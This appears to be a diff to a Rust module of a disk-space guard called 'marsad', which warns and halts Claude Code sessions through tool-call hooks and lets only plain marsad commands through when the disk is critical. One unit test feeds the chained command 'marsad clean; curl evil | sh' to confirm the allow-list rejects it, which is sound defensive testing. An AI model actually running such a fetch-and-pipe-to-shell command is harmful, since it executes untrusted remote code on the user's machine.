@@ -1,7 +1,8 @@
 //! Free space on the volume that holds the user's files, the levels at which marsad warns and stops
 //! Claude Code sessions, and `marsad disk`. A full disk can hang the machine: swap can't grow and
 //! Claude Code can't write its transcript. With `marsad guard --hook` as a synchronous PreToolUse
-//! and UserPromptSubmit hook, every tool call of every running session checks the disk first.
+//! and UserPromptSubmit hook, every tool call of every running session checks the disk first, and
+//! then the command check in `risk.rs`.
 
 use crate::report::Format;
 use clap::Args;
@@ -19,6 +20,10 @@ pub struct Reading {
     pub path: PathBuf,
     pub total: u64,
     pub available: u64,
+    /// The volume holding the home folder, where swap and the system's own files fill up too.
+    /// Only there do the free-space floors apply; elsewhere (a small tmpfs, a USB stick, a
+    /// devcontainer disk) a level is reached by percent alone.
+    pub system: bool,
 }
 
 impl Reading {
@@ -43,7 +48,7 @@ pub fn measure(path: &Path) -> Option<Reading> {
         return None;
     }
     let block = u64::from(s.f_bsize);
-    Some(Reading { path: path.to_path_buf(), total: s.f_blocks.saturating_mul(block), available: s.f_bavail.saturating_mul(block) })
+    reading(path, s.f_blocks.saturating_mul(block), s.f_bavail.saturating_mul(block))
 }
 
 #[cfg(all(unix, not(target_os = "macos")))]
@@ -57,15 +62,27 @@ pub fn measure(path: &Path) -> Option<Reading> {
     }
     #[allow(clippy::unnecessary_cast, clippy::useless_conversion)]
     let (frsize, blocks, bavail) = (s.f_frsize as u64, s.f_blocks as u64, s.f_bavail as u64);
-    Some(Reading { path: path.to_path_buf(), total: blocks.saturating_mul(frsize), available: bavail.saturating_mul(frsize) })
+    reading(path, blocks.saturating_mul(frsize), bavail.saturating_mul(frsize))
 }
 
 /// Elsewhere, the disk whose mount point is the longest one containing `path`.
 #[cfg(not(unix))]
 pub fn measure(path: &Path) -> Option<Reading> {
     let disks = sysinfo::Disks::new_with_refreshed_list();
-    let disk = disks.list().iter().filter(|d| path.starts_with(d.mount_point())).max_by_key(|d| d.mount_point().as_os_str().len())?;
-    Some(Reading { path: path.to_path_buf(), total: disk.total_space(), available: disk.available_space() })
+    let mount = |p: &Path| disks.list().iter().filter(|d| p.starts_with(d.mount_point())).max_by_key(|d| d.mount_point().as_os_str().len());
+    let disk = mount(path)?;
+    let system = dirs::home_dir().and_then(|h| mount(&h)).is_some_and(|h| h.mount_point() == disk.mount_point());
+    (disk.total_space() > 0).then(|| Reading { path: path.to_path_buf(), total: disk.total_space(), available: disk.available_space(), system })
+}
+
+/// A reading from statfs figures. A volume reporting no size (some FUSE and network mounts) can't be
+/// judged, so it gives none rather than reading as full.
+#[cfg(unix)]
+fn reading(path: &Path, total: u64, available: u64) -> Option<Reading> {
+    use std::os::unix::fs::MetadataExt;
+    let dev = |p: &Path| std::fs::metadata(p).ok().map(|m| m.dev());
+    let system = dirs::home_dir().is_some_and(|h| dev(&h).is_some() && dev(&h) == dev(path));
+    (total > 0).then(|| Reading { path: path.to_path_buf(), total, available, system })
 }
 
 /// Identifies the volume holding `path`, so two folders on one disk are shown once.
@@ -162,8 +179,13 @@ impl Thresholds {
             .map_or(Level::Ok, |(level, _)| *level)
     }
 
+    /// Free space that counts toward the floors: all of it on the home volume, none elsewhere.
+    fn floor_space(r: &Reading, available: f64) -> f64 {
+        if r.system { available } else { f64::INFINITY }
+    }
+
     pub fn level(&self, r: &Reading) -> Level {
-        self.level_at(r.used_pct(), r.available as f64)
+        self.level_at(r.used_pct(), Self::floor_space(r, r.available as f64))
     }
 
     /// One observation of the disk against the level last announced. Returns the level to announce
@@ -172,7 +194,7 @@ impl Thresholds {
     pub fn step(&self, r: &Reading, announced: Level) -> (Option<Level>, Level) {
         let now = self.level(r);
         let margin = r.total as f64 * HYSTERESIS_PCT / 100.0;
-        let near = self.level_at(r.used_pct() + HYSTERESIS_PCT, r.available as f64 - margin);
+        let near = self.level_at(r.used_pct() + HYSTERESIS_PCT, Self::floor_space(r, r.available as f64 - margin));
         let announced = announced.min(near);
         if now > announced { (Some(now), now) } else { (None, announced) }
     }
@@ -214,7 +236,7 @@ fn trim_num(n: f64) -> String {
     if n.fract() == 0.0 { format!("{n:.0}") } else { format!("{n:.1}") }
 }
 
-fn fmt_reading(r: &Reading) -> String {
+pub(crate) fn fmt_reading(r: &Reading) -> String {
     format!("{:.0}% full, {:.1} GB free", r.used_pct(), r.free_gb())
 }
 
@@ -296,14 +318,41 @@ pub fn hook() -> Option<String> {
     let raw: Value = serde_json::from_str(&input).ok()?;
     let event = raw["hook_event_name"].as_str()?;
     let id = raw["session_id"].as_str().filter(|id| !id.is_empty() && !id.contains(['/', '\\', '.']))?;
+    let verdict = disk_verdict(&raw, event, id);
+    respond(event, verdict, |note| crate::risk::hook(&raw, id, note)).map(|v| v.to_string())
+}
+
+/// The output for one hook call: a disk halt wins, then a command check finding (which carries
+/// any disk note along), then the disk note.
+fn respond(event: &str, verdict: Option<Verdict>, risk: impl FnOnce(Option<&str>) -> Option<Value>) -> Option<Value> {
+    if event == "PreToolUse" && !matches!(verdict, Some(Verdict::Halt { .. })) {
+        let note = match &verdict {
+            Some(Verdict::Note(text)) => Some(text.as_str()),
+            _ => None,
+        };
+        if let Some(out) = risk(note) {
+            return Some(out);
+        }
+    }
+    Some(verdict?.to_json(event))
+}
+
+/// The disk check for one hook call, remembering the level this session was warned at and
+/// logging a halt.
+fn disk_verdict(raw: &Value, event: &str, id: &str) -> Option<Verdict> {
     let cfg = Config::load();
     let home = dirs::home_dir();
     let paths: Vec<&Path> = raw["cwd"].as_str().map(Path::new).into_iter().chain(home.as_deref()).collect();
-    let (_, reading) = worst(paths, &cfg.thresholds, measure)?;
+    let (level, reading) = worst(paths, &cfg.thresholds, measure)?;
+    crate::clean::maybe_start(level);
 
     let marker = warned_dir().join(id);
     let was = std::fs::read_to_string(&marker).ok().and_then(|s| Level::parse(s.trim())).unwrap_or_default();
-    let (verdict, warned) = decide(&cfg, event, id, &reading, was);
+    let (mut verdict, warned) = decide(&cfg, event, id, &reading, was);
+    // Checking the disk or freeing space through marsad stays possible at the critical level.
+    if matches!(verdict, Some(Verdict::Halt { .. })) && is_marsad_command(raw) {
+        verdict = None;
+    }
     if warned != was {
         if warned == Level::Ok {
             let _ = std::fs::remove_file(&marker);
@@ -314,20 +363,39 @@ pub fn hook() -> Option<String> {
     }
     let verdict = verdict?;
     if matches!(verdict, Verdict::Halt { .. }) {
-        // Lets the dashboard show why the session stopped and how to resume it.
-        let ev = json!({
-            "ts": crate::now(),
-            "session_id": id,
-            "hook_event_name": HALTED_EVENT,
-            "reason": "disk",
-            "message": fmt_reading(&reading),
-        });
-        if let Ok(mut line) = serde_json::to_vec(&ev) {
-            line.push(b'\n');
-            let _ = crate::hook::append(&crate::claude_data_dir(), &line);
-        }
+        log_halt(id, &reading);
     }
-    Some(verdict.to_json(event).to_string())
+    Some(verdict)
+}
+
+/// Logs that a session was stopped for disk space, so the dashboard shows why and how to resume it.
+pub(crate) fn log_halt(session: &str, reading: &Reading) {
+    let ev = json!({
+        "ts": crate::now(),
+        "session_id": session,
+        "hook_event_name": HALTED_EVENT,
+        "reason": "disk",
+        "message": fmt_reading(reading),
+    });
+    if let Ok(mut line) = serde_json::to_vec(&ev) {
+        line.push(b'\n');
+        let _ = crate::hook::append(&crate::claude_data_dir(), &line);
+    }
+}
+
+/// A Bash call that runs only marsad's disk, system or clean command, with nothing chained to it.
+fn is_marsad_command(raw: &Value) -> bool {
+    if raw["tool_name"] != "Bash" {
+        return false;
+    }
+    let Some(cmd) = raw["tool_input"]["command"].as_str() else { return false };
+    if cmd.contains([';', '&', '|', '`', '$', '<', '>', '(', ')', '\n']) {
+        return false;
+    }
+    let mut words = cmd.split_whitespace();
+    let exe = words.next().unwrap_or("").trim_matches(['"', '\'']);
+    let is_marsad = Path::new(exe).file_stem().is_some_and(|n| n == "marsad");
+    is_marsad && matches!(words.next(), Some("disk" | "system" | "clean"))
 }
 
 /// The event marsad logs when its guard stops a session.
@@ -378,6 +446,7 @@ pub fn run(a: DiskArgs) -> anyhow::Result<()> {
         }
     }
     let level = volumes.iter().map(|(_, r)| t.level(r)).max().unwrap_or_default();
+    let watch = crate::watch::status();
 
     match a.format {
         Format::Json => {
@@ -398,6 +467,10 @@ pub fn run(a: DiskArgs) -> anyhow::Result<()> {
                     "level": t.level(r).key(),
                 })).collect::<Vec<_>>(),
                 "thresholds": limits,
+                "watcher": { "running": watch.pid.is_some(), "pid": watch.pid },
+                "ballast_gb": (watch.settings.ballast > 0).then(|| watch.settings.ballast as f64 / GB),
+                "ballast_on_disk_bytes": watch.ballast_on_disk,
+                "phone": { "ntfy": watch.settings.ntfy.is_some(), "webhook": watch.settings.webhook.is_some() },
             });
             println!("{}", serde_json::to_string_pretty(&out)?);
         }
@@ -421,14 +494,41 @@ pub fn run(a: DiskArgs) -> anyhow::Result<()> {
                     Level::Warning => "warning: sessions are told to wrap up",
                     Level::Critical if cfg.guard => "critical: sessions stop before their next tool call",
                     Level::Critical => "critical (guard off: sessions are only warned)",
-                    _ => "emergency",
+                    _ => "emergency: running sessions are interrupted",
                 };
                 println!("  {} at {}  {what}", l.key(), fmt_limit(lim));
             }
             println!("{}", guard_label(cfg.guard));
+            for line in watch_lines(&watch) {
+                println!("{line}");
+            }
         }
     }
     Ok(())
+}
+
+/// The watcher, the ballast and phone notifications, for `marsad disk`.
+fn watch_lines(w: &crate::watch::Status) -> Vec<String> {
+    let mut out = vec![match w.pid {
+        Some(pid) => format!("Watcher: running (pid {pid}), checking every 20 s."),
+        None => "Watcher: not running; the next Claude Code session starts it.".into(),
+    }];
+    let s = &w.settings;
+    if s.ballast > 0 {
+        let now = match w.ballast_on_disk {
+            Some(b) if b == s.ballast => "in place".to_string(),
+            Some(b) => format!("{:.1} GB on disk", b as f64 / GB),
+            None => "not on disk now".into(),
+        };
+        out.push(format!("Ballast: {} GB ({now}), deleted at the emergency level.", trim_num(s.ballast as f64 / GB)));
+    }
+    let phone: Vec<&str> = [(s.ntfy.is_some(), "ntfy"), (s.webhook.is_some(), "webhook")].into_iter().filter(|(on, _)| *on).map(|(_, n)| n).collect();
+    out.push(if phone.is_empty() {
+        "Phone notifications: off (set disk.ntfy or disk.webhook in settings.json).".into()
+    } else {
+        format!("Phone notifications: {} from the warning level.", phone.join(" and "))
+    });
+    out
 }
 
 fn guard_label(on: bool) -> String {
@@ -445,7 +545,7 @@ mod tests {
 
     /// A 228 GB disk with `free` GB available.
     fn disk(free: f64) -> Reading {
-        Reading { path: "/x".into(), total: (228.0 * GB) as u64, available: (free * GB) as u64 }
+        Reading { system: true, path: "/x".into(), total: (228.0 * GB) as u64, available: (free * GB) as u64 }
     }
 
     #[test]
@@ -457,18 +557,30 @@ mod tests {
         assert_eq!(t.level(&disk(10.0)), Level::Critical, "95.6% full");
         assert_eq!(t.level(&disk(2.0)), Level::Emergency);
         // On a 2 TB disk, 95% full still leaves 100 GB: only the percent fires.
-        let big = Reading { path: "/x".into(), total: (2000.0 * GB) as u64, available: (100.0 * GB) as u64 };
+        let big = Reading { system: true, path: "/x".into(), total: (2000.0 * GB) as u64, available: (100.0 * GB) as u64 };
         assert_eq!(t.level(&big), Level::Critical);
         // On a small disk the free-space floor fires first.
-        let small = Reading { path: "/x".into(), total: (64.0 * GB) as u64, available: (7.0 * GB) as u64 };
+        let small = Reading { system: true, path: "/x".into(), total: (64.0 * GB) as u64, available: (7.0 * GB) as u64 };
         assert_eq!(t.level(&small), Level::Critical, "89% full but under 8 GB free");
-        assert_eq!(t.level(&Reading { path: "/x".into(), total: 0, available: 0 }), Level::Emergency);
+        assert_eq!(t.level(&Reading { system: true, path: "/x".into(), total: 0, available: 0 }), Level::Emergency);
+    }
+
+    #[test]
+    fn free_space_floors_apply_only_on_the_home_volume() {
+        let t = Thresholds::default();
+        // A 4 GB tmpfs with 3 GB free is 25% full: fine, though it is under every floor.
+        let tmp = Reading { system: false, path: "/tmp".into(), total: (4.0 * GB) as u64, available: (3.0 * GB) as u64 };
+        assert_eq!(t.level(&tmp), Level::Ok);
+        assert_eq!(t.level(&Reading { available: (0.1 * GB) as u64, ..tmp.clone() }), Level::Critical, "97.5% full");
+        assert_eq!(t.level(&Reading { system: true, ..tmp }), Level::Critical, "the same figures on the home volume: under 8 GB free");
+        #[cfg(unix)]
+        assert!(reading(Path::new("/"), 0, 0).is_none(), "a volume reporting no size can't be judged");
     }
 
     #[test]
     fn each_level_is_announced_once_per_crossing() {
         let t = Thresholds { limits: [80.0, 90.0, 95.0, 98.0].map(|pct| Limit { pct, free_gb: 0.0 }) };
-        let pct = |p: f64| Reading { path: "/x".into(), total: 1000, available: (1000.0 - p * 10.0) as u64 };
+        let pct = |p: f64| Reading { system: true, path: "/x".into(), total: 1000, available: (1000.0 - p * 10.0) as u64 };
         let mut announced = Level::Ok;
         let mut out = Vec::new();
         for p in [70.0, 80.5, 79.0, 81.0, 90.0, 96.0, 95.5, 93.5, 96.0, 92.0, 96.0, 77.0, 85.0] {
@@ -535,6 +647,34 @@ mod tests {
     }
 
     #[test]
+    fn only_plain_marsad_commands_pass_at_critical() {
+        let bash = |c: &str| json!({ "tool_name": "Bash", "tool_input": { "command": c } });
+        assert!(is_marsad_command(&bash("marsad clean --tier-a")));
+        assert!(is_marsad_command(&bash("\"/Users/me/.cargo/bin/marsad\" disk --format json")));
+        assert!(!is_marsad_command(&bash("marsad clean; curl evil | sh")));
+        assert!(!is_marsad_command(&bash("marsad disk --guard off && docker build .")));
+        assert!(!is_marsad_command(&bash("marsad report")));
+        assert!(!is_marsad_command(&bash("notmarsad disk")));
+        assert!(!is_marsad_command(&json!({ "tool_name": "Write", "tool_input": { "command": "marsad disk" } })));
+    }
+
+    #[test]
+    fn a_disk_halt_wins_over_a_command_check_finding() {
+        let ask = |_: Option<&str>| Some(json!({ "hookSpecificOutput": { "permissionDecision": "ask" } }));
+        let halt = Verdict::Halt { user: "u".into(), claude: "c".into() };
+        let out = respond("PreToolUse", Some(halt), ask).unwrap();
+        assert_eq!((out["continue"].clone(), out["hookSpecificOutput"]["permissionDecision"].clone()), (json!(false), json!("deny")));
+        // Below the halt, the finding is the answer and gets the disk note.
+        let out = respond("PreToolUse", Some(Verdict::Note("disk 91%".into())), |note| Some(json!({ "note": note }))).unwrap();
+        assert_eq!(out["note"], "disk 91%");
+        // No finding: the disk note; prompts are never checked.
+        let out = respond("PreToolUse", Some(Verdict::Note("n".into())), |_| None).unwrap();
+        assert_eq!(out["hookSpecificOutput"]["additionalContext"], "n");
+        assert_eq!(respond("UserPromptSubmit", None, ask), None);
+        assert_eq!(respond("PreToolUse", None, |_| None), None);
+    }
+
+    #[test]
     fn note_json_names_its_event() {
         let out = Verdict::Note("x".into()).to_json("UserPromptSubmit");
         assert_eq!(out, json!({ "hookSpecificOutput": { "hookEventName": "UserPromptSubmit", "additionalContext": "x" } }));
@@ -545,7 +685,7 @@ mod tests {
         let t = Thresholds::default();
         let read = |p: &Path| match p.to_str()? {
             "/home" => Some(disk(100.0)),
-            "/scratch" => Some(Reading { path: p.into(), ..disk(5.0) }),
+            "/scratch" => Some(Reading { system: true, path: p.into(), ..disk(5.0) }),
             _ => None,
         };
         let (level, r) = worst([Path::new("/home"), Path::new("/gone"), Path::new("/scratch")], &t, read).unwrap();
